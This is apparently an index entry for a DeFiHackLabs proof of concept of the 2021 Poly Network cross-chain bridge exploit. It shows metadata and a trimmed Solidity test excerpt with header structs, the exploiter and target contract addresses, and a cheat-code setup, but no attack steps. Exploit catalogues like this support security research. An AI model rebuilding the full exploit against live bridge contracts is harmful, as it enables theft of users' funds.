# [?] Poly Network - Bridge, getting around modifier through cross-chain message

## Summary
Severity: Unknown
Chain: Ethereum
Component: PolyNetwork
Published: 2021-08-11
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2021-08/PolyNetwork_exp.sol
Type: defi-exploit-poc

## Details
```solidity
contract ContractTest is Test {
    struct Header {
        uint32 version;
        uint64 chainId;
        uint32 timestamp;
        uint32 height;
        uint64 consensusData;
        bytes32 prevBlockHash;
        bytes32 transactionsRoot;
        bytes32 crossStatesRoot;
        bytes32 blockRoot;
        bytes consensusPayload;
        bytes20 nextBookkeeper;
    }

    struct ToMerkleValue {
        bytes txHash; // cross chain txhash
        uint64 fromChainID;
        TxParam makeTxParam;
    }

    struct TxParam {
        bytes txHash; //  source chain txhash
        bytes crossChainId;
        bytes fromContract;
        uint64 toChainId;
        bytes toContract;
        bytes method;
        bytes args;
    }

    address exploiter = 0xC8a65Fadf0e0dDAf421F28FEAb69Bf6E2E589963;
    address EthCrossChainManager = 0x838bf9E95CB12Dd76a54C9f9D2E3082EAF928270;
    address EthCrossChainData = 0xcF2afe102057bA5c16f899271045a0A37fCb10f2;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2021-08/PolyNetwork_exp.sol_
